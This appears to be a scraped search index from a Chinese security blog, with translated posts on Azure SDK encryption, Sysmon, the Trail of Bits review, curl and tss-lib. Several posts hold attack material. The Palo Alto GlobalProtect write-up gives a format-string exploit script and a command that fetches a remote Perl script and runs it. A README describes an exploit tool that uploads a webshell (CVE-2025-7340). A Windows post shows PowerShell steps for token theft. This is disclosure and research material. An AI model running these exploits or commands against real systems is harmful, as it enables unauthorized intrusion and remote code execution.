Storage博客中的\u0026quot;如何验证是否使用客户端加密功能\u0026quot;章节确认影响范围。迁移v2需要：a)更新代码使用v2加密方案；b)迁移v1加密数据至v2。替代方案可考虑使用Azure存储服务端加密。\n技术细节\rAzure Storage SDK原v1版本使用CBC分组加密模式，当攻击者具有blob写入权限并能观测解密失败时，可能实施填充Oracle攻击。研究表明攻击者需对每个明文字节执行大量密钥操作才能解密blob内容。微软感谢谷歌通过CVD流程报告该漏洞。\n参考资源\rAzure Storage博客 CVE-2022-30187 技术支持：通过Azure门户提交支持案例(aka.ms/azsupt) ","date":"2025-08-02T04:16:37+08:00","permalink":"http://localhost:1313/p/azure-storage-sdk%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8A%A0%E5%AF%86%E5%A1%AB%E5%85%85oracle%E6%BC%8F%E6%B4%9E%E7%BC%93%E8%A7%A3%E6%96%B9%E6%A1%88/","title":"Azure Storage SDK客户端加密填充Oracle漏洞缓解方案"},{"content":"将防御者的困境转化为防御者的优势\r网络安全防御者处于天然劣势的观点——即所谓的\u0026quot;防御者困境\u0026quot;——不仅是错误的，而且具有反作用。与其只关注如何应对攻击者的策略，我们更应该识别并利用防御者身份的固有优势。本文将阐述防御者思维的内涵，以及它如何帮助强化安全体系。\n什么是防御者困境？\r多年来，安全专业人士一直用\u0026quot;防御者困境\u0026quot;来解释为何企业在防范网络攻击时处于劣势。其核心观点是：\n\u0026ldquo;防御者处于劣势，因为我们必须时刻保持正确，而攻击者只需成功一次。\u0026rdquo;\n按照这种观点，防御者需要关注所有可能的攻击路径并全面防护。我们必须艰难地选择重点防御哪些攻击路径（这就是困境所在），这使我们处于不利地位。这种劣势还源于我们需要全面应对每一次攻击，这意味着有时会漏掉某些攻击。\n防御者困境的概念不仅令人沮丧，而且并不正确。防御者完全可以获得相对于攻击者的优势。\n防御者困境的谬误\r防御者困境之所以是谬误，部分原因在于它过度简化了网络攻击的复杂性。以MITRE ATT\u0026amp;CK框架为例，它展示了攻击者为达成目标必须遵循的多步骤过程。根据ATT\u0026amp;CK，攻击者通常从侦察开始，进展到资源开发，再到初始访问，之后还必须突破多个阶段才能实现目标。\n攻击者必须成功完成每个阶段才能达成任务。而防御者只需干扰其中一个环节就能挫败攻击，迫使攻击者调整策略。行业资深人士Richard Bejtlich早在2009年就在入侵检测背景下观察到这点，创造了\u0026quot;入侵者困境\u0026quot;一词。他指出：\n\u0026ldquo;防御者只需检测到入侵者存在的一个指标，就能在企业内部启动事件响应。\u0026rdquo;\n另一位备受尊敬的网络安全专家David J. Bianco在2023年扩展了这一观点，提出了\u0026quot;攻击者困境\u0026quot;的概念。除了指出\u0026quot;攻击者必须在整个攻击生命周期中都做对\u0026quot;，他还强调：\n\u0026ldquo;攻击者通常在不完全了解目标环境的情况下行动。\u0026rdquo;\n我们的固有优势——防御者优势——在于我们能够比攻击者更深入地了解自身环境。通过前瞻性规划和设计，我们可以创建改变与攻击者互动方式的安全架构。\n获取防御者优势\r防御者困境假设防御者只能被动等待攻击发生然后响应。这种被动立场让攻击者掌握了主动权，使防御者总是处于追赶状态。为改变这种态势，行业分析师强调防御者需要实践\u0026quot;主动安全\u0026quot;。Omdia的Eric Parizo用这个术语鼓励企业：\n\u0026ldquo;在可能的威胁对扩展IT环境构成危险之前，就主动寻找并消除它们。\u0026rdquo;\nForrester的Erik Nost认为，实践主动安全意味着通过强大的可见性、优先级排序和修复来控制安全态势并减少违规。这一过程始于对环境的深入了解，这样我们才能知道需要保护的资源和需要解决的安全弱点。\n地形认知并非网络安全独有，这个概念适用于各个领域的攻击者和防御者，包括历史上的战场。例如，在1450年的阿金库尔战役中，英军将自己部署在两侧有树林的狭窄战场上，将法国骑士引入受限空间。通过收窄战线，英军击败了规模大得多的法军。\n就像阿金库尔战役一样，在网络安全防御中创建瓶颈点是建立防御者优势的一种方式。例如，通过单点登录(SSO)提供商集中SaaS登录，可以让组织应用可靠的安全措施，如双因素认证和异常检测。SSO迫使攻击者通过防御者控制的瓶颈点来攻击SaaS目标，使他们处于劣势。\n更广泛地说，要获得防御者优势，我们应该：\n了解我们的环境：持续更新所有资产的清单，包括硬件、软件、SaaS平台和用户账户。了解每项资源的业务目的。这一基础步骤让我们明确知道需要保护什么以及潜在的安全改进点在哪里。\n最小化攻击面：定期修补漏洞软件，关闭不需要的系统，禁用或停用不需要的服务，并强制使用SSO来减少入口点。这些行动共同减少了潜在的攻击向量数量。\n基于上下文优先修复：根据系统关键性、业务流程和敏感性评估每个漏洞的风险。优先解决最重大的风险。这种有针对性的方法确保资源被有效分配到最高优先级的领域。\n有节制地修复：制定并执行修复计划，以可控和实际的方式实施变更。监控修复工作的进展和效果，使用指标跟踪改进并在需要时干预。这确保安全改进项目能达到预期效果。\n要获得防御者优势，首先需要彻底了解你的环境，这使你能够识别和修复弱点，部署自动化响应措施，并设计将攻击引导至防御最严密环节的架构。通过减少攻击面和优先处理安全改进机会来最小化攻击路径可能。监督修复工作以确保进展。通过从被动思维转向主动思维，彻底扭转攻击者的优势。\n","date":"2025-08-02T03:55:18+08:00","permalink":"http://localhost:1313/p/%E5%B0%86%E9%98%B2%E5%BE%A1%E8%80%85%E7%9A%84%E5%9B%B0%E5%A2%83%E8%BD%AC%E5%8C%96%E4%B8%BA%E9%98%B2%E5%BE%A1%E8%80%85%E7%9A%84%E4%BC%98%E5%8A%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%96%B0%E6%80%9D%E7%BB%B4/","title":"将防御者的困境转化为防御者的优势：网络安全新思维"},{"content":"工具发布公告：Sysmon v6安全监控工具\rSysmon正在持续进化。\n我们很高兴宣布@markrussinovich和@mxatone已发布Sysmon v6版本。两年前首次讨论Sysmon v2时仅支持7种事件类型，如今已扩展至19种事件类型外加错误事件。从Mark在RSA大会的演示中可以看到新增的3种v6事件类型（已高亮显示）。\nSysmon事件类型\r\u0026ldquo;本次发布的Sysmon作为后台监控工具，可将系统活动记录到事件日志中用于安全事件检测和取证。新版本新增了事件模式显示选项、配置变更事件记录、标准化注册表路径显示，以及命名管道创建和连接事件监控功能。\u0026rdquo;\nMark的演示包含了Sysmon优化运行的基础事件推荐配置：\n基础事件推荐配置\r（图表内容：进程创建/终止、网络连接、文件创建时间变更等核心监控项）\n基础事件推荐配置（续）\r（图表内容：WMI事件、驱动程序加载、跨进程注入等高级监控项）\n强烈建议采用这些推荐配置进行部署。初学者可使用Sysmon配置模板快速上手，如@SwiftOnSecurity在Github提供的sysmon-config-export.xml。该模板特点包括：\n每行配置均有详细注释 按功能分区并附带解释说明 兼具Sysmon教学指南功能 涵盖Windows系统关键监控区域 部署命令示例：\nsysmon.exe -accepteula -i sysmonconfig-export.xml\n实战演示：驱动加载检测\r通过WinPMEM内存取证工具加载内核驱动时，Sysmon准确捕获了Event ID 6（驱动加载）事件：\n1 2 WinPMEM执行命令： winpmem_2.1.post4.exe -l -d winpmem.sys Windows事件查看器对应日志：\nApplications and Services Logs/Microsoft/Windows/Sysmon/Operational\n最后附上Mark提出的Sysmon最佳实践要点：\n全环境部署（包括工作站和服务器） 结合威胁情报优化配置 建立事件响应流程 集中化日志收集与分析 立即部署Sysmon v6，全面提升您的安全监控能力！\n","date":"2025-08-02T03:38:35+08:00","permalink":"http://localhost:1313/p/sysmon-v6-%E5%AE%89%E5%85%A8%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%8F%91%E5%B8%83%E5%85%AC%E5%91%8A%E5%A2%9E%E5%BC%BAwindows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E8%BF%BD%E8%B8%AA%E8%83%BD%E5%8A%9B/","title":"Sysmon v6 安全监控工具发布公告：增强Windows系统安全事件追踪能力"},{"content":"2017年度回顾 - Trail of Bits博客\r2017年是技术突破的一年！我们在自动化漏洞发现、符号执行和二进制翻译等领域发布了创新研究，并改进了安全研究人员依赖的基础工具。我们在智能合约安全领域扩大影响力，成为顶尖的区块链安全公司。\n创新研究\r自动化漏洞发现进入现实世界\r2017年该领域发展迅猛。我们与洛克希德·马丁和国防部DIUx签订合同，应用我们的网络推理系统(Cyber Reasoning System)。同时我们将CGC挑战二进制文件移植到Windows、macOS和Linux平台，为工具评估提供客观基准。\nManticore提升符号执行工具可用性\r我们开源了高度灵活的符号执行工具Manticore，它已成为DARPA LADS项目的重要组成部分。我们将其应用于以太坊虚拟机(EVM)字节码分析，可自动发现合约函数、生成触发合约状态的交易并检查失败状态。\nMcSema 2.0实现二进制文件近似源代码处理\r我们对二进制翻译工具McSema进行了重大升级：代码清理、性能提升，并分离指令语义与控制流恢复创建Remill库。演示用例包括二进制补丁修改、与KLEE的符号执行，以及重用基于LLVM的工具(如libFuzzer)。\n基础工具\r巩固以太坊基础设施\r我们开发了行业领先的智能合约安全工具套件，包括适配Manticore用于以太坊安全审计。我们加入了企业以太坊联盟(EEA)，并公开了RSK和DappHub Sai的安全审计报告。\nosquery扩展功能边界\r我们在2016年将Facebook的开源终端监控代理移植到Windows后，继续增强osquery框架：重新设计基于auditd的文件完整性监控，添加CCleaner恶意软件检测功能，并创建扩展仓库。\niVerify满足iPhone用户基本需求\r我们发布了包含最全面iOS越狱检测的iVerify库，可检测iOS 10和11的越狱状态，并承诺随iOS更新持续维护。\nAlgo普及自托管VPN服务\r我们2016年发布的自托管个人VPN服务器Algo在2017年获得广泛关注。它采用现代协议和密码，包含最小化软件集，并得到70名Github贡献者的704次提交。\n学习与分享\r推动漏洞缓解措施部署\r我们比较了clang的CFI与Visual Studio的CFG实现，创建了Windows Defender的\u0026quot;Flying Sandbox Monster\u0026quot;——首个Windows平台沙盒化反病毒扫描器，使用Rust框架在AppContainers中隔离不可信应用。\n聚焦Binary Ninja\r我们通过多种方式展示Vector35逆向平台的能力：解释其低级中间语言(LLIL)基础、演示如何开发平台无关工具、分享DEF CON CTF挑战分析模块。\n支持重要事业\r我们赞助UIUC CTF等竞赛，支持GreHack等会议，并赞助Risky Business播客分享安全洞见。\n2018年展望\r我们将继续推进国防部DIUx的Voltron项目、深化区块链安全研究、增强开源项目支持(osquery、Google Santa等)、发布iVerify独立版、优化Algo的易用性，并通过DeepState等工具使先进技术更易获取。\n","date":"2025-08-02T03:22:11+08:00","permalink":"http://localhost:1313/p/2017%E5%B9%B4%E5%BA%A6%E5%9B%9E%E9%A1%BE%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E7%AA%81%E7%A0%B4/","title":"2017年度回顾：自动化漏洞挖掘、符号执行与区块链安全的技术突破"},{"content":"Windows登录会话的过度共享\rWindows的登录会话通常与单个经过身份验证的用户及其令牌绑定。然而对于服务账户而言情况并非如此——在服务加固机制下，同一个登录会话中可能存在多个带有不同服务组的令牌。本文将展示这种共享机制如何破坏服务加固的隔离性（至少对NETWORK SERVICE账户有效），并再次强调S-1-1-0并非安全边界。\n技术核心：LSASS令牌缓存机制\r当LSASS为新登录会话创建令牌时，会存储该令牌以供后续检索。虽然大多数场景下这个机制无显著作用，但在网络认证时会被重新启用。观察AcquireCredentialsHandleAPI的原型时会发现pvLogonID参数，其说明指出：\n\u0026ldquo;指向标识用户的本地唯一标识符(LUID)。此参数为文件系统进程（如网络重定向器）提供。该参数可为NULL。\u0026rdquo;\n拥有TCB权限时，此参数可指定用于网络认证的登录会话ID（从令牌视角看即认证ID）。虽然常规网络认证中令牌无法跨机器跟随，但在本地环回认证场景下，服务端协商获得的令牌将是会话令牌而非调用方令牌。\n利用SMB实现权限提升\r关键线索在于说明中的\u0026quot;网络重定向器\u0026quot;。最易访问且支持本地环回认证的重定向器是什么？SMB协议。它是否提供获取网络认证令牌的原语？命名管道。SMB是否以内核模式进行网络认证从而具备TCB特权？确实如此。\n漏洞复现（Windows 10 1909环境）\r首先需要NETWORK SERVICE权限的PowerShell进程（可通过作者前文方法实现） 创建命名管道并监听连接： 1 2 $pipe = New-NtNamedPipeFile \\\\.\\pipe\\ABC -Win32Path $job = Start-Job { $pipe.Listen() } 通过本地主机访问管道： 1 2 $file = Get-NtFile \\\\localhost\\pipe\\ABC -Win32Path Wait-Job $job | Out-Null 在模拟命名管道时打开RPCSS进程： 1 2 3 $p = Use-NtObject($pipe.Impersonate()) { Get-NtProcess -ProcessId 1152 } 此时获得的访问权限为AllAccess，因为LSASS存储的是该登录会话中首个令牌（即RPCSS进程的令牌）。 技术验证\r检查模拟令牌的组列表可确认该令牌属于RPCSS服务：\n1 2 3 4 $token = Use-NtObject($pipe.Impersonate()) { Get-NtToken -Impersonation } $token.Groups | ? Name -Match Rpcss 输出显示NT SERVICE\\RpcSs组的存在，证实了令牌来源。\n影响范围\r此特性存在于所有登录会话，但普通用户会话的利用价值较低。需注意的是：当以NETWORK SERVICE身份访问管理共享时，实际会以RPCSS服务身份认证，可能访问该服务SID创建的文件。本文仅抛砖引玉，相信读者能发掘更多创造性利用方式。\n","date":"2025-08-02T02:55:08+08:00","permalink":"http://localhost:1313/p/windows%E7%99%BB%E5%BD%95%E4%BC%9A%E8%AF%9D%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E7%AA%81%E7%A0%B4%E6%9C%8D%E5%8A%A1%E5%8A%A0%E5%9B%BA%E9%9A%94%E7%A6%BB%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","title":"Windows登录会话共享漏洞：突破服务加固隔离的技术分析"},{"content":"今天我们发布了安全公告2458511，通报了利用Internet Explorer漏洞的有限攻击事件。IE9测试版不受影响，而IE6、7、8存在风险。目前发现的攻击仅针对Windows XP系统上的IE6和7版本，IE8用户不会受到成功攻击。本文将解析漏洞原理、说明IE8风险降低的原因，并提供防护建议。\n漏洞原理\rIE在解析HTML时对特定CSS标签组合的内存分配不足，可能导致虚表指针最低有效字节被覆盖。攻击者通过特定模式的内存喷射（heap spray）可能实现代码执行。数据执行保护（DEP）正是防御此类堆喷射攻击的有效手段。\nDEP的防护作用\r当前所有攻击均被DEP阻断。IE8默认启用DEP，早期版本也可手动开启（详见公告）。由于该漏洞非典型释放后使用（use-after-free）类型，攻击者难以绕过DEP防护。现有DEP绕过技术无法直接应用，因为内存破坏属于部分虚表指针覆盖。我们预计任何绕过DEP的利用尝试都将极不稳定（导致IE崩溃），特别是在支持地址空间布局随机化（ASLR）的系统上。\n增强防护措施\r除启用DEP外，最佳解决方案是通过用户自定义CSS文件覆盖网站提供的CSS样式。该方法能阻止所有IE版本进入漏洞代码路径，且应用兼容性风险极低。公告中详细描述了在HKEY_CURRENT_USER注册表项中配置用户CSS的方法。\nEMET的进阶防护\r今年发布的EMET 2.0工具集通过多种安全缓解技术防御漏洞利用。除强制启用DEP外，EMET还包含强制性ASLR和EAT访问过滤（EAF）等防护机制。需注意安装EMET后需单独配置应用防护（详见公告和用户手册）。\n致谢Fermin J. Serna对本问题和EMET工作的贡献。\nMSRC工程团队：Andrew Roths、Jonathan Ness、Chengyun Chu ","date":"2025-08-02T02:33:23+08:00","permalink":"http://localhost:1313/p/dep%E4%B8%8Eemet%E9%98%B2%E6%8A%A4%E6%9C%80%E6%96%B0ie%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/","title":"DEP与EMET防护最新IE漏洞攻击的技术解析"},{"content":"攻击SSL VPN系列(一)：Palo Alto GlobalProtect预认证RCE漏洞分析\r作者: Orange Tsai(@orange_8361) 和 Meh Chang(@mehqq_)\nSSL VPN用于保护企业资产免受互联网暴露，但如果SSL VPN本身存在漏洞会怎样？它们暴露在互联网上，被信任为保护内网入口的唯一屏障。一旦SSL VPN服务器被攻破，攻击者就能渗透内网甚至控制所有连接到该VPN的用户！基于其重要性，过去几个月我们启动了对主流SSL VPN产品安全性的研究。\n我们计划分三篇文章发布研究成果。本文将作为首篇，因为它是一个有趣的故事，非常适合作为我们在Black Hat USA和DEFCON演讲的开胃菜：\n《像NSA一样渗透企业内网 - 主流SSL VPN的预认证RCE漏洞！》\n漏洞详情\r这是一个无需认证的简单格式字符串漏洞。sslmgr是处理服务器与客户端SSL握手的SSL网关，通过Nginx反向代理暴露在/sslmgr路径下。\n1 2 3 4 5 6 $ curl https://global-protect/sslmgr \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;clientcert-response\u0026gt; \u0026lt;status\u0026gt;error\u0026lt;/status\u0026gt; \u0026lt;msg\u0026gt;Invalid parameters\u0026lt;/msg\u0026gt; \u0026lt;/clientcert-response\u0026gt; 在参数提取过程中，守护进程会搜索字符串scep-profile-name并将其值作为snprintf格式字符串来填充缓冲区，导致格式字符串攻击。使用%n即可使服务崩溃：\n1 2 3 4 5 POST /sslmgr HTTP/1.1 Host: global-protect Content-Length: 36 scep-profile-name=%n%n%n%n%n... 受影响版本\r根据我们的调查，2018年7月之前的所有GlobalProtect版本均受影响：\nPalo Alto GlobalProtect SSL VPN 7.1.x \u0026lt; 7.1.19 Palo Alto GlobalProtect SSL VPN 8.0.x \u0026lt; 8.0.12 Palo Alto GlobalProtect SSL VPN 8.1.x \u0026lt; 8.1.3 9.x和7.0.x系列不受此漏洞影响。\n漏洞验证方法\r虽然我们知道漏洞位置，但验证并不容易。该格式字符串没有输出，我们无法通过地址泄露来验证。我们选择使用%c作为验证工具：\n1 2 3 4 $ time curl -s -d \u0026#39;scep-profile-name=%9999999c\u0026#39; https://global-protect/sslmgr \u0026gt;/dev/null real 0m1.721s user 0m0.037s sys 0m0.005s 随着%c数量的增加，响应时间相应延长，从而优雅地识别出存在漏洞的SSL VPN。\n漏洞利用\r确定具体版本后，我们通过修改Global Offset Table(GOT)中的strlen指针为system的Procedure Linkage Table(PLT)地址来实现利用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #!/usr/bin/python import requests from pwn import * url = \u0026#34;https://sslvpn/sslmgr\u0026#34; cmd = \u0026#34;echo pwned \u0026gt; /var/appweb/sslvpndocs/hacked.txt\u0026#34; strlen_GOT = 0x667788 # 需修改 system_plt = 0x445566 # 需修改 fmt = \u0026#39;%70$n\u0026#39; fmt += \u0026#39;%\u0026#39; + str((system_plt\u0026gt;\u0026gt;16)\u0026amp;0xff) + \u0026#39;c\u0026#39; fmt += \u0026#39;%32$hn\u0026#39; fmt += \u0026#39;%\u0026#39; + str((system_plt\u0026amp;0xffff)-((system_plt\u0026gt;\u0026gt;16)\u0026amp;0xff)) + \u0026#39;c\u0026#39; fmt += \u0026#39;%24$hn\u0026#39; for i in range(40,60): fmt += \u0026#39;%\u0026#39;+str(i)+\u0026#39;$p\u0026#39; data = \u0026#34;scep-profile-name=\u0026#34; data += p32(strlen_GOT)[:-1] data += \u0026#34;\u0026amp;appauthcookie=\u0026#34; data += p32(strlen_GOT+2)[:-1] data += \u0026#34;\u0026amp;host-id=\u0026#34; data += p32(strlen_GOT+4)[:-1] data += \u0026#34;\u0026amp;user-email=\u0026#34; data += fmt data += \u0026#34;\u0026amp;appauthcookie=\u0026#34; data += cmd r = requests.post(url, data=data) 修改完成后，sslmgr就成为我们的webshell，可以通过以下方式执行命令：\n1 $ curl -d \u0026#39;scep-profile-name=curl orange.tw/bc.pl | perl -\u0026#39; https://global-protect/sslmgr Uber案例分析\r在我们确认这不是0day后，调查了全球使用存在漏洞GlobalProtect的大型企业，Uber是其中之一。以vpn.awscorp.uberinternal.com为例：\n从域名推测Uber使用AWS Marketplace的BYOL服务。从登录页面看似乎是8.x版本，最终我们确定版本为8.0.6并成功获取shell。\nUber迅速响应并修复了漏洞，他们给出了详细的漏洞奖励决定说明：\n\u0026ldquo;虽然这是一个无需认证的RCE，但由于该Palo Alto SSL VPN不是员工使用的主要VPN，且部署在AWS而非核心基础设施中，因此整体影响和位置优势较低。\u0026rdquo;\n我们享受整个研究过程并向安全社区反馈，这比漏洞奖励更有价值！\n","date":"2025-08-02T02:11:51+08:00","permalink":"http://localhost:1313/p/%E6%94%BB%E5%87%BBssl-vpn%E7%B3%BB%E5%88%97%E4%B8%80palo-alto-globalprotect%E9%A2%84%E8%AE%A4%E8%AF%81rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%A5uber%E4%B8%BA%E4%BE%8B/","title":"攻击SSL VPN系列(一)：Palo Alto GlobalProtect预认证RCE漏洞分析，以Uber为例"},{"content":"内存泄漏来自doh_write_cb函数\r漏洞摘要\rcurl_fuzzer_http发现了一个内存泄漏问题\n受影响版本\rcurl 8.13.0-DEV (x86_64-apple-darwin23.6.0)\nlibcurl/8.13.0-DEV OpenSSL/1.0.2n zlib/1.2.11 libidn2/2.0.4 libpsl/0.19.1 nghttp2/1.55.1 librtmp/2.3\n发布日期: [未发布]\n协议支持: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp ws wss\n功能特性: alt-svc AsynchDNS HSTS HTTP2 HTTPS-proxy IDN IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP UnixSockets\n复现步骤\r使用复现程序运行fuzzer\n支持材料/参考\r堆栈跟踪如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ==14==ERROR: LeakSanitizer: detected memory leaks Direct leak of 107 byte(s) in 1 object(s) allocated from: #0 0x55da4969379c in realloc /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:82:3 #1 0x55da496ff27b in curl_dbg_realloc /src/curl/lib/memdebug.c:265:9 #2 0x55da497fc6f3 in dyn_nappend /src/curl/lib/dynbuf.c:111:15 #3 0x55da497faee5 in doh_write_cb /src/curl/lib/doh.c:183:6 #4 0x55da497f2636 in cw_out_ptr_flush /src/curl/lib/cw-out.c:224:16 #5 0x55da497f1644 in cw_out_do_write /src/curl/lib/cw-out.c:383:14 #6 0x55da497f0ab6 in cw_out_write /src/curl/lib/cw-out.c:416:14 #7 0x55da497f2f62 in cw_pause_write /src/curl/lib/cw-pause.c:192:14 #8 0x55da497476e1 in Curl_cwriter_write /src/curl/lib/sendf.c:184:10 #9 0x55da497476e1 in cw_download_write /src/curl/lib/sendf.c:312:14 #10 0x55da497415b9 in Curl_cwriter_write /src/curl/lib/sendf.c:184:10 #11 0x55da497415b9 in Curl_client_write /src/curl/lib/sendf.c:92:12 #12 0x55da498363a5 in Curl_http_write_resp /src/curl/lib/http.c:4201:14 #13 0x55da49762635 in Curl_xfer_write_resp /src/curl/lib/transfer.c:862:14 #14 0x55da4975e364 in sendrecv_dl /src/curl/lib/transfer.c:342:14 #15 0x55da4975e364 in Curl_sendrecv /src/curl/lib/transfer.c:441:14 #16 0x55da497250f5 in state_performing /src/curl/lib/multi.c:1733:12 #17 0x55da497250f5 in multi_runsingle /src/curl/lib/multi.c:2423:12 #18 0x55da497222f2 in curl_multi_perform /src/curl/lib/multi.c:2599:16 #19 0x55da496d3e98 in fuzz_handle_transfer(fuzz_data*) /src/curl_fuzzer/curl_fuzzer.cc:419:5 #20 0x55da496d2e47 in LLVMFuzzerTestOneInput /src/curl_fuzzer/curl_fuzzer.cc:97:3 需要传递-runs=100参数，如：/out/curl_fuzzer_http /out/leak-247f5201c537eecc44d9f44dd815fd43f19a8a72 -runs=100，因为并非每次都会出现该问题\n影响\r内存泄漏可能最终导致拒绝服务(DOS)\u0026hellip;\n后续讨论\r报告者认为这可能不是安全问题而是信息性问题 curl团队确认该问题存在于DNS over HTTPS(doh.c)处理过程中，泄漏量小且不频繁 团队提供了修复PR(#16834)并确认已合并 报告者验证修复后确认问题已解决 最终该报告被标记为\u0026quot;Informative\u0026quot;而非安全漏洞 ","date":"2025-08-02T01:29:19+08:00","permalink":"http://localhost:1313/p/curl%E5%BA%93doh_write_cb%E5%87%BD%E6%95%B0%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"curl库doh_write_cb函数内存泄漏漏洞分析"},{"content":"🚨 HT Contact Form Widget \u0026lt;= 2.2.1 - 未授权任意文件上传漏洞(CVE-2025-7340)\rCVE编号: CVE-2025-7340\nCVSS评分: 9.8 (严重)\n📝 漏洞描述\rWordPress插件**HT Contact Form Widget For Elementor Page Builder \u0026amp; Gutenberg Blocks \u0026amp; Form Builder.**在2.2.1及之前版本中，temp_file_upload函数缺少文件类型验证，导致存在任意文件上传漏洞。\n该漏洞允许未认证的攻击者向服务器上传任意文件，可能导致远程代码执行(RCE)。\n⚡ 漏洞利用脚本\r本仓库包含一个Python利用脚本，可自动发现存在漏洞的表单并向目标网站上传Webshell。\n脚本会智能检测所需参数(nonce, form_id, ajax endpoint)，并将PHP Webshell上传至漏洞路径。\n✅ 存在漏洞的表单URL示例:\n1 http://target.com/contact/ ✅ 目标页面必须包含存在漏洞的表单\n📦 环境要求\r运行脚本前需安装以下Python模块:\n1 pip install -r requirements.txt requirements.txt内容:\n1 2 requests colorama � 使用方法\r1 2 3 4 5 6 7 usage: CVE-2025-7340.py [-h] CVE-2025-7340漏洞利用脚本 - 未授权任意文件上传 | 作者: Khaled Alenazi (Nxploited) options: -h, --help 显示帮助信息 -u, --url URL 目标URL 例如 http(s)://target.com 选项说明:\r选项 描述 -h, --help 显示帮助信息 -u, --url URL 目标URL 例如 http(s)://target.com/contact 🐚 Webshell使用说明\r漏洞利用成功后，可通过给定路径访问上传的Webshell。\n附加?cmd=\u0026lt;your_command\u0026gt;参数可执行系统命令。\n✅ 示例:\n1 http://target.com/wp-content/uploads/ht_form/temp/shell.php?cmd=whoami 🖥️ 示例输出\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 开始对目标进行漏洞利用... 获取目标页面... 提取参数... 获取Nonce: 346c441903 AJAX端点: http://nxploit.ddev.site/wp-admin/admin-ajax.php 表单ID: 86 生成Webshell... 上传Webshell，请稍候... [+] 漏洞利用成功! 访问路径: wp-content/uploads/ht_form/temp/687590d90ac1c-shell.php 作者: Khaled Alenazi (Nxploited) - GitHub: https://github.com/Nxploited 🛑 免责声明\r本工具仅用于教育研究目的。\n作者不对代码滥用造成的任何损害负责。\n测试任何系统前请务必获得明确授权。\n👨‍💻 作者\rKhaled Alenazi (Nxploited)\nGitHub: Nxploited\n","date":"2025-08-02T01:12:17+08:00","permalink":"http://localhost:1313/p/wordpress-ht-contact-form%E6%8F%92%E4%BB%B6%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Ecve-2025-7340%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/","title":"WordPress HT Contact Form插件未授权任意文件上传漏洞(CVE-2025-7340)利用分析"},{"content":"Trail of Bits公开披露两个影响Binance阈值签名方案库(tss-lib)及其主要活跃分叉项目的漏洞。受影响代码库包括：\nBinance的tss-lib Clover Network的threshold-crypto Keep Network的keep-ecdsa Swingby的tss-lib THORchain的tss-lib ZenGo X的curv 攻击者只需在密钥生成或重新共享协议启动时配置恶意ID，即可窃取其他用户的私钥或使其节点崩溃。\n阈值签名方案是强大的密码学工具，但需要零知识证明、承诺方案和可验证秘密共享等复杂非标准化原语。由于缺乏实施指南，实践中常出现类似我们披露的这两个漏洞。\n阈值签名方案原理\n阈值签名允许用户组共同控制签名私钥，与多重签名(multisig)的区别在于：多重签名每个用户持有独立密钥，而阈值签名中每个用户持有同一密钥的份额。阈值签名只需生成一个组签名。\n可验证秘密共享(VSS)\nShamir秘密共享通过生成t-1次随机多项式（常数项设为密钥值），在n个不同点求值创建份额。Feldman方案在此基础上增加了可验证性。\n漏洞技术细节\n零值泄露漏洞：当多项式在x=0处求值时直接泄露常数项密钥。虽然多数实现通过检查ID非零来防护，但未对椭圆曲线群阶取模检查，导致设置ID为群阶q时仍会泄露密钥。\n模运算崩溃漏洞：计算拉格朗日系数时，若IDi ≡ SelfID (mod q)，会导致模逆不存在。脆弱实现未验证模逆直接解引用空指针。\nZKDocs发布\n我们推出非标准化密码原语文档ZKDocs，包含秘密共享等协议的完整实现细节和安全考量。例如关于零值份额漏洞的详细分析可在ZKDocs的秘密共享章节查阅。\n时间线\n2021.10.19 发现tss-lib数据泄露\n2021.12.06 向各厂商报告\n截至2021.12.20，除Clover外所有厂商均已修复\nBinance、Keep Network等团队已提交修复补丁。我们呼吁开发者：\n模运算前必须进行模约简 始终验证模逆和模平方根操作 必要时联系专业审计 ","date":"2025-08-02T00:55:39+08:00","permalink":"http://localhost:1313/p/%E6%8F%AD%E7%A7%98shamir%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ezkdocs%E5%8F%91%E5%B8%83/","title":"揭秘Shamir秘密共享漏洞与ZKDocs发布"},{"content":"REST API认证的5种基础策略\r作为现代应用的支柱，REST API在实现数据层与表现层分离的同时，也需要通过认证机制保护敏感数据。以下是五种基础认证方法及其特点：\n基础认证（Basic Authentication）\r采用Base64编码格式在HTTP头中存储用户名密码 优势：开发工具链广泛支持，实现轻量简单 风险：凭证以明文传输，必须配合SSL/TLS通道使用 局限：缺乏原生多因素认证支持 API密钥\r通过机器生成的字符串创建凭证-令牌对 部署方式：可嵌入载荷、HTTP头或查询字符串 特点：支持凭证与访问令牌解耦，便于权限变更时撤销 风险：与基础认证同样存在凭证拦截可能 